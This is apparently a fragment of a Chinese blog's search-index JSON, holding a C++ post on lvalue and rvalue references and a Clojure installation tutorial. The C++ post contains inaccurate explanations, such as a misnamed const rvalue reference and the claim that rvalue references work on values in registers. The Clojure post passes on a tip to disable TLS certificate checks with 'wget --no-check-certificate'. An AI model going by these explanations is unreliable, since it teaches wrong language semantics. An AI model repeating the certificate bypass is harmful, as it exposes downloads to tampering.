class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> v[<span class=\"number\">12</span>] &#123;</span><br><span class=\"line\">                <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">                <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">                <span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;</span><br><span class=\"line\">        <span class=\"function\">matrix <span class=\"title\">m1</span><span class=\"params\">(<span class=\"number\">3</span>, <span class=\"number\">4</span>, v)</span></span>;</span><br><span class=\"line\">        matrix m2 = <span class=\"number\">2</span> * m1;</span><br><span class=\"line\"></span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;m1 = \\n&quot;</span> &lt;&lt; m1 &lt;&lt; std::endl;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;m2 = \\n&quot;</span> &lt;&lt; m2 &lt;&lt; std::endl;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;m1 + m2 = \\n&quot;</span> &lt;&lt; m1 + m2 &lt;&lt; std::endl;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>他创建了两个矩阵对象<code>m1</code>和<code>m2</code>，分别打印<code>m1</code>，<code>m2</code>以及<code>m1 + m1</code>。如果注释掉<code>std::cout &lt;&lt; &quot;m1 + m2 = \\n&quot; &lt;&lt; m1 + m2 &lt;&lt; std::endl;</code>，可以正常执行,输出结果如下：</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">m1 =</span><br><span class=\"line\">1       2       3       4</span><br><span class=\"line\">5       6       7       8</span><br><span class=\"line\">9       10      11      12</span><br><span class=\"line\">g</span><br><span class=\"line\">m2 =</span><br><span class=\"line\">2       4       6       8</span><br><span class=\"line\">10      12      14      16</span><br><span class=\"line\">18      20      22      24</span><br></pre></td></tr></table></figure>\n<p>但是一旦加上这句，就会报如下错误：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  matrix-rref g++ main.cpp matrix.cpp -o main</span><br><span class=\"line\">main.cpp: In function ‘<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span>’:</span></span><br><span class=\"line\"><span class=\"function\">main.cpp:<span class=\"number\">14</span>:<span class=\"number\">30</span>: error: no match for ‘operator&lt;&lt;’ (operand types are ‘std::basic_ostream&lt;char&gt;’ and ‘matrix’)</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">14</span> |  std::cout &lt;&lt; <span class=\"string\">&quot;m1 + m2 = \\n&quot;</span> &lt;&lt; m1 + m2 &lt;&lt; std::endl;</span></span><br><span class=\"line\">      |  ~~~~~~~~~~~~~~~~~~~~~~~~~~~ ^~ ~~~~~~~</span><br><span class=\"line\">      |            |                       |</span><br><span class=\"line\">      |            |                       matrix</span><br><span class=\"line\">      |            std::basic_ostream&lt;<span class=\"keyword\">char</span>&gt;</span><br><span class=\"line\">In file included from main.cpp:<span class=\"number\">2</span>:</span><br><span class=\"line\">matrix.h:<span class=\"number\">25</span>:<span class=\"number\">24</span>: note: candidate: ‘std::ostream&amp; <span class=\"keyword\">operator</span>&lt;&lt;(std::ostream&amp;, matrix&amp;)’ &lt;near match&gt;</span><br><span class=\"line\">   <span class=\"number\">25</span> |   <span class=\"keyword\">friend</span> std::ostream&amp; <span class=\"keyword\">operator</span> &lt;&lt; (std::ostream &amp;out, matrix&amp; m);</span><br><span class=\"line\">      |                        ^~~~~~~~</span><br><span class=\"line\">matrix.h:<span class=\"number\">25</span>:<span class=\"number\">24</span>: note:   conversion of argument <span class=\"number\">2</span> would be ill-formed:</span><br><span class=\"line\">main.cpp:<span class=\"number\">14</span>:<span class=\"number\">36</span>: error: cannot bind non-<span class=\"keyword\">const</span> lvalue reference of type ‘matrix&amp;’ to an rvalue of type ‘matrix’</span><br><span class=\"line\">   <span class=\"number\">14</span> |  std::cout &lt;&lt; <span class=\"string\">&quot;m1 + m2 = \\n&quot;</span> &lt;&lt; m1 + m2 &lt;&lt; std::endl;</span><br><span class=\"line\">      |                                 ~~~^~~~</span><br></pre></td></tr></table></figure>\n<p>意思是找不到参数列表的为<code>‘std::basic_ostream&lt;char&gt;</code>和<code>matrix</code>的输出流重载。起初，我以为是运算符优先级的问题，但发现<code>cout &lt;&lt; 1 + 3 &lt;&lt; endl</code>这种是能正常输出结果的。这次错误的原因编译器已经告诉我们了：<code>cannot bind non-const lvalue reference of type ‘matrix&amp;’ to an rvalue of type ‘matrix’</code>，即：无法将的左值<code>matrix</code>引用引用绑定到<code>matrix</code>右值。</p>\n<p>我检查了我重载的输出流函数原型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">friend</span> std::ostream&amp; <span class=\"keyword\">operator</span> &lt;&lt; (std::ostream &amp;out, matrix &amp;m);</span><br></pre></td></tr></table></figure><br>发现<code>matrix &amp;m</code>前没有加上<code>const</code>修饰，记得课上看到的输出输出流重载的参数写法都是<code>const T&amp; v</code>，或许和这有关？把函数修改为：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">friend</span> std::ostream&amp; <span class=\"keyword\">operator</span> &lt;&lt; (std::ostream &amp;out, <span class=\"keyword\">const</span> matrix &amp;m);</span><br></pre></td></tr></table></figure><br>再次编译，果然编译通过了，成功运行。以前的写法都是照着博客上的写法依葫芦画瓢，没有深究这里<code>const</code>修饰符的意义，但实际上这里涉及到一个重要的规则：<strong>非常值左值引用不能绑定右值</strong>。接下来，解释一下什么是左值与右值。</p>\n<h2 id=\"左值与右值\"><a href=\"#左值与右值\" class=\"headerlink\" title=\"左值与右值\"></a>左值与右值</h2><p>例：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">114</span> + <span class=\"number\">514</span>;</span><br></pre></td></tr></table></figure><br>这条语句在内存的栈上开辟了一个4字节的空间，<code>a</code>有一个属于他的地址<code>&amp;a</code>。而<code>114 + 514</code>是一个表达式字面量，他也有值，但是我们无法用一个地址获得它（它可能位于内存，也可能位于寄存器）。<code>a</code>位于等号左侧，属于左值；<code>114 + 514</code>位于等号右侧，属于右值。</p>\n<p>百科中的定义：</p>\n<ul>\n<li>L-value中的L指的是Location，表示可寻址。a value (computer science)that has an address.</li>\n<li>R-value中的R指的是Read，表示可读。in computer science, a value that does not have an address in a computer language.</li>\n</ul>\n<p>也就是说，区分左值还是右值的依据是：是否可以根据某个显示声明的变量获取到他的内存地址。有名字，可以取地址的就是左值，反之是右值（将亡值或纯右值）。<br>左值有地址，所以一定在内存中；右值则可能在寄存器中。</p>\n<h2 id=\"左值引用和右值引用\"><a href=\"#左值引用和右值引用\" class=\"headerlink\" title=\"左值引用和右值引用\"></a>左值引用和右值引用</h2><p>C++的引用就是一个值别名，他用于绑定一个值且不占空间。</p>\n<ul>\n<li>对一个左值进行引用的类型叫左值引用</li>\n<li>对一个右值进行引用的类型叫右值引用</li>\n</ul>\n<p>左值引用是具名变量值的别名，而右值引用则是不具名（匿名）变量的别名。</p>\n<p>引用类型还可以被<code>const</code>修饰，被<code>const</code>修饰的引用对绑定的值是只读的。根据引用类型左右值，和是否被<code>const</code>修饰，将引用类型分为四种（<code>ra</code>）：</p>\n<ul>\n<li>常左值引用：<code>const T&amp; ra = a</code></li>\n<li>非常左值引用：<code>T&amp; ra = a</code></li>\n<li>常右值引用：<code>const T&amp;a = 1</code></li>\n<li>非常右值引用：<code>T&amp;&amp; a = 1</code></li>\n</ul>\n<p>其中<strong>非常左值引用</strong>和<strong>非常右值引用</strong>可以对绑定的对象修改，而<strong>常左值引用</strong>和<strong>常右值引用</strong>对绑定的对象只读。</p>\n<p><strong>常左值引用</strong>是万能引用，除了可以绑定左值和右值，可以和任意上述四种引用类型绑定，提供只读操作：</p>\n<ol>\n<li>绑定左值</li>\n</ol>\n<p>常量左值绑定：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = a;</span><br></pre></td></tr></table></figure></p>\n<p>非常量左值绑定：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = a;</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><p>绑定右值</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = <span class=\"number\">1</span> + <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>绑定常左值引用</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; rb = b;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = rb;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>绑定非常左值引用</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span>&amp; rb = b;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = rb;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>绑定常右值引用</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; a = <span class=\"number\">1</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = a;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>绑定非常右值引用 </p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>&amp;&amp; a = <span class=\"number\">1</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&amp; ra = a;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><strong>非常左值引用</strong>只能绑定<strong>非常左值引用</strong>，绑定右值则会失败：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>&amp; a = <span class=\"number\">1</span> + <span class=\"number\">1</span>; <span class=\"comment\">//编译错误</span></span><br></pre></td></tr></table></figure></p>\n<p>回到之前的问题：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">friend</span> std::ostream&amp; <span class=\"keyword\">operator</span> &lt;&lt; (std::ostream &amp;out, matrix &amp;m)</span><br></pre></td></tr></table></figure><br>其中<code>matrix&amp; m</code>参数是<strong>非常左值引用</strong>，当执行<code>cout &lt;&lt; m1 &lt;&lt; endl</code>时，<code>m1</code>是一个变量，属于左值，能够被<strong>非常左值引用绑定</strong>。而执行<code>cout &lt;&lt; m1 + m2 &lt;&lt; endl</code>的时候，<code>m1 + m2</code>是一个表达式，属于右值，而<strong>非常左值引用无法绑定右值</strong>，所以编译器会找不到参数列表匹配的函数，编译出错。</p>\n<p>用关键字<code>T&amp;&amp; a</code>表示右值引用，右值引用通常不能绑定到任何的左值，要想绑定一个左值到右值引用，通常需要<code>std::move()</code>将左值强制转换为右值，例如：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a; </span><br><span class=\"line\"><span class=\"keyword\">int</span> &amp;&amp;r1 = a;             # 右值引用r1直接绑定左值a，编译失败</span><br><span class=\"line\"><span class=\"keyword\">int</span> &amp;&amp;r2 = std::<span class=\"built_in\">move</span>(a);  # 强行把左值a转化成右值，再绑定到右值引用r2，编译通过</span><br></pre></td></tr></table></figure></p>\n<p>下面来说一下为什么要右值引用，右值引用在你需要使用寄存器中的值的时候可以进行右值引用。寄存器的刷新速度很快，没有右值引用的话就需要将寄存器中的值拷贝到内存中，在进行使用，这是很浪费时间的。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getdata</span><span class=\"params\">(<span class=\"keyword\">int</span> &amp;&amp;num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    cout &lt;&lt; num;</span><br><span class=\"line\">    num += <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a = <span class=\"number\">5</span>;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">getdata</span>(a + <span class=\"number\">1</span>) &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上<code>int getdata(int &amp;&amp;num)</code>就是对右值进行引用。 <code>getdata(a + 1)</code>中<code>a + 1</code>是右值在寄存器中，我们是不可以直接对他进行操作的，如果要操作得将其拷贝到内存中，如果是一个非常大的数据这种拷贝就会很占用内存，如果直接用右值引用就可以直接对其进行操作。从而节约内存。将右值转化为左值 直接新建变量然后赋值就可以了</p>\n<p>右值和左值可以相互转化：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> b = a + <span class=\"number\">1</span>; <span class=\"comment\">//将 a + 1这个右值转变为左值了</span></span><br><span class=\"line\"><span class=\"built_in\">move</span>(a) <span class=\"comment\">//将a这个左值转变为了右值</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.csdn.net/qq_35630119/article/details/117638274\">错误分析:Error, no match for ‘operator&lt;&lt;‘无匹配的左移运算符</a></li>\n<li><a href=\"https://baike.baidu.com/item/%E5%8F%B3%E5%80%BC/6187364?fr=aladdin\">百度百科: 右值</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/88047800\">左值引用和右值引用</a></li>\n</ul>\n","categories":["C++之左值右值"],"tags":["CPP"]},{"title":"七周七语言之-Clojure","url":"/2019/06/11/%E4%B8%83%E5%91%A8%E4%B8%83%E8%AF%AD%E8%A8%80%E4%B9%8B-Clojure/","content":"<blockquote>\n<p>Clojure是一门运行在JVM上的lisp方言。</p>\n</blockquote>\n<h2 id=\"Common-Lisp\"><a href=\"#Common-Lisp\" class=\"headerlink\" title=\"Common Lisp\"></a>Common Lisp</h2><p>common lisp安装<code>sudo pacman -S common-lisp</code>,选择[1]的<code>clisp</code>实现，输入<code>clisp</code>进入交互shell环境。</p>\n<h2 id=\"Clojure安装\"><a href=\"#Clojure安装\" class=\"headerlink\" title=\"Clojure安装\"></a>Clojure安装</h2><ul>\n<li>环境：Archlinux </li>\n<li>jdk: 12<br>首先安装clojure语言，使用pacman安装会找不到类途径，于是我还是手动安装了。官网提供的<a href=\"https://www.clojure.org/guides/getting_started\">安装方式</a><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -O https://download.clojure.org/install/linux-install-1.10.1.447.sh</span><br><span class=\"line\">sudo chmod +x linux-install-1.10.1.447.sh </span><br><span class=\"line\">sudo ./linux-install-1.10.1.447.sh </span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 18.8M  100 18.8M    0     0   717k      0  0:00:26  0:00:26 --:--:--  961k</span><br><span class=\"line\">Installing libs into /usr/local/lib/clojure</span><br><span class=\"line\">Installing clojure and clj into /usr/local/bin</span><br><span class=\"line\">Installing man pages into /usr/local/share/man/man1</span><br><span class=\"line\">Removing download</span><br><span class=\"line\">Use clj -h for help.</span><br></pre></td></tr></table></figure>\n<p>此时在<code>/usr/local/lib/clojure/libexec</code>下出<code>clojure-tools-1.10.1.447.jar</code>，clojure本质上就是一个jar包，完全可以用java直接启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp clojure-tools-1.10.1.447.jar clojure.main</span><br><span class=\"line\">Clojure 1.10.1</span><br><span class=\"line\">user=&gt; </span><br></pre></td></tr></table></figure><br>然后安装clojure的构建管理工具<a href=\"https://leiningen.org\">leiningen</a><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /usr/bin</span><br><span class=\"line\">sudo wget https://raw.githubusercontent.com/technomancy/leiningen/stable/bin/lein</span><br><span class=\"line\">sudo chmod a+x lein</span><br><span class=\"line\">lein</span><br></pre></td></tr></table></figure><br>此时会执行自安装脚本，挂梯子https代理，可能会出现如下的错误：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/technomancy/leiningen/releases/download/2.5.0/leiningen-2.5.0-standalone.jar  (exit code 7) It‘s possible your HTTP client‘s certificate store does not have the correct certificate authority needed. This is often caused by an out-of-date version of libssl. It‘s also possible that you‘re behind a firewall and haven‘t set HTTP_PROXY and HTTPS_PROXY.“</span><br></pre></td></tr></table></figure><br>解决方法：<code>export HTTP_CLIENT=&quot;wget --no-check-certificate -O&quot;</code>。官网是这么说的，不过我这里行不通，报错如下，提示找不到Clojure的类：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error: Could not find or load main class clojure.main</span><br><span class=\"line\">Caused by: java.lang.ClassNotFoundException: clojure.main</span><br></pre></td></tr></table></figure><br>解决办法，手动下载leiningen的jar包，去leiningen的<a href=\"https://github.com/technomancy/leiningen/releases\">release</a>下载最新的standlone包，大概20M。下载后改名zip为jar,配置环境变量<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LEIN_HOME=<span class=\"variable\">$HOME</span>/.lein</span><br><span class=\"line\"><span class=\"built_in\">export</span> LEIN_JAR=<span class=\"variable\">$LEIN_HOME</span>/self-installs/leiningen-2.9.1-standalone.jar</span><br></pre></td></tr></table></figure><br>然后移到下载的jar包对应目录下。</p>\n<p>此时<code>clojure -V</code>下载maven依赖，然后<code>lein repl</code>，若干秒后，启动repl。<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ lein repl</span><br><span class=\"line\">nREPL server started on port 39511 on host 127.0.0.1 - nrepl://127.0.0.1:39511</span><br><span class=\"line\">REPL-y 0.4.3, nREPL 0.6.0</span><br><span class=\"line\">Clojure 1.10.0</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM 12.0.1+12</span><br><span class=\"line\">    Docs: (doc function-name-here)</span><br><span class=\"line\">          (find-doc <span class=\"string\">&quot;part-of-name-here&quot;</span>)</span><br><span class=\"line\">  Source: (<span class=\"built_in\">source</span> function-name-here)</span><br><span class=\"line\"> Javadoc: (javadoc java-object-or-class-here)</span><br><span class=\"line\">    Exit: Control+D or (<span class=\"built_in\">exit</span>) or (quit)</span><br><span class=\"line\"> Results: Stored <span class=\"keyword\">in</span> vars *1, *2, *3, an exception <span class=\"keyword\">in</span> *e</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><h3 id=\"基本运算\"><a href=\"#基本运算\" class=\"headerlink\" title=\"基本运算\"></a>基本运算</h3><p>clojure作为一门lisp方言，每个语句都是一个表，用括号表示，这是一种<strong>前缀表达式</strong>，即运算符（函数）写在最前面，之后是参数。<br>简单的逻辑运算<br><figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">-</span></span> <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">-1</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">+</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"number\">3</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">*</span></span> <span class=\"number\">1</span> <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"number\">3</span></span><br><span class=\"line\">user=&gt; (/ <span class=\"number\">1</span> <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"number\">1</span>/<span class=\"number\">3</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span>(/ <span class=\"number\">1</span> <span class=\"number\">3</span>))</span><br><span class=\"line\">clojure.lang.Ratio</span><br></pre></td></tr></table></figure><br>clojure支持变长的参数列表，会顺序执行：<br><figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">+</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">2</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">+</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span> <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">+</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span> <span class=\"number\">3</span> <span class=\"number\">4</span> <span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"number\">14</span></span><br></pre></td></tr></table></figure><br>clojure或根据括号的嵌套顺序，依次执行运算<br><figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">+</span></span> (<span class=\"name\"><span class=\"builtin-name\">+</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>) (/ <span class=\"number\">3</span> <span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"number\">11</span>/<span class=\"number\">4</span></span><br></pre></td></tr></table></figure><br>这在判断一个列表是否排序时，可以写的很精妙：<br><figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">&lt;</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span> <span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"literal\">true</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">&lt;</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">4</span> <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"literal\">false</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"类型系统\"><a href=\"#类型系统\" class=\"headerlink\" title=\"类型系统\"></a>类型系统</h3><p>clojure支持强类型，也支持动态类型。clojure中的基本构成是<strong>形式（Form）</strong>，形式可以看成是语法的一部分，clojure解析代码时，会将程序编译成多份叫做形式的片段，然后编译或者解释。clojure中。<strong>不区分代码和数据</strong>，在lisp中，这两者是一种东西，是等价的。一类类型和内嵌容器（布尔，字符，字符串，集合，映射，向量）这些东西都是形式。</p>\n<ol>\n<li><p>字符串/字符</p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\">print</span> <span class=\"string\">&quot;hello\\nI&#x27;am XUranus&quot;</span>)</span><br><span class=\"line\">hello</span><br><span class=\"line\">I&#x27;am XUranusnil</span><br><span class=\"line\">user=&gt; (<span class=\"name\">println</span> <span class=\"string\">&quot;hello\\nI&#x27;am XUranus&quot;</span>)</span><br><span class=\"line\">hello</span><br><span class=\"line\">I&#x27;am XUranus</span><br><span class=\"line\"><span class=\"literal\">nil</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\">println</span> \\H\\e\\l\\l\\o)</span><br><span class=\"line\">Hello</span><br><span class=\"line\"><span class=\"literal\">nil</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">str</span></span> \\H \\e \\l \\l \\o)</span><br><span class=\"line\"><span class=\"string\">&quot;Hello&quot;</span></span><br><span class=\"line\">user=&gt; </span><br></pre></td></tr></table></figure>\n<p>字符串和其他语言没有什么两样，但是字符的表示方法是<code>\\c</code>，<code>print</code>函数也和其他语言的输出函数无区别，<code>str</code>是用来连接字符成字符串的。</p>\n</li>\n<li><p>布尔值和逻辑表达式</p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span> (<span class=\"name\"><span class=\"builtin-name\">=</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>))</span><br><span class=\"line\">java.lang.Boolean</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">=</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"literal\">false</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">=</span></span> <span class=\"number\">1</span> <span class=\"number\">1.0</span>)</span><br><span class=\"line\"><span class=\"literal\">false</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">=</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"literal\">true</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">if</span></span> (<span class=\"name\"><span class=\"builtin-name\">=</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>) (<span class=\"name\">println</span> <span class=\"string\">&quot;one equals one&quot;</span>))</span><br><span class=\"line\">one equals one</span><br><span class=\"line\"><span class=\"literal\">nil</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">if</span></span> (<span class=\"name\"><span class=\"builtin-name\">&lt;</span></span> <span class=\"number\">1</span> <span class=\"number\">1</span>) (<span class=\"name\">println</span> <span class=\"string\">&quot;one equals one&quot;</span>) (<span class=\"name\">print</span> <span class=\"string\">&quot;one don&#x27;t equals ones&quot;</span>))</span><br><span class=\"line\">one don&#x27;t equals onesnil</span><br><span class=\"line\"><span class=\"literal\">nil</span></span><br></pre></td></tr></table></figure>\n<p>支持已经可以发觉JVM在clojure中的体现，因为clojure底层实际上就是jvm，他的类型也和java是对应的。</p>\n</li>\n</ol>\n<p>clojure中的逻辑分支语句的格式就是<code>(if &lt;bool&gt; &lt;express1&gt; &lt;express2&gt;)</code>,根据bool判断执行分支,expression2默认是else分支，可以省略。</p>\n<ol>\n<li><p>列表（List）<br>列表是<strong>有序</strong>元素的的集合，元素可以是任何东西，但clojure中列表一般用做代码，向量用做数据</p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span> &#x27;(<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>))</span><br><span class=\"line\">clojure.lang.PersistentList</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span> (<span class=\"name\"><span class=\"builtin-name\">list</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>))</span><br><span class=\"line\">clojure.lang.PersistentList</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">=</span></span> (<span class=\"name\"><span class=\"builtin-name\">list</span></span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>) &#x27;(<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>) )</span><br><span class=\"line\"><span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>虽然clojure的语句就是列表，比如<code>(+ 1 2)</code>就是一个列表，但是这种列表是用来代表函数要被执行求值的，所以创建一个一般的列表不能这么写。<br>上述展示了两种表的创建方法，前者方式为引用(quoting),可以看到他们底层类型一致，值也完全相当等，这两种创建是等价的。<br>表支持几种基本算子，<code>first</code>,<code>last</code>,<code>rest</code>,<code>cons</code>,分别表示第一个数据，最后一个数据除了第一个数据之后的数据，链接构造新表。</p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">first</span></span> &#x27;(<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>))</span><br><span class=\"line\"><span class=\"symbol\">:one</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">last</span></span> 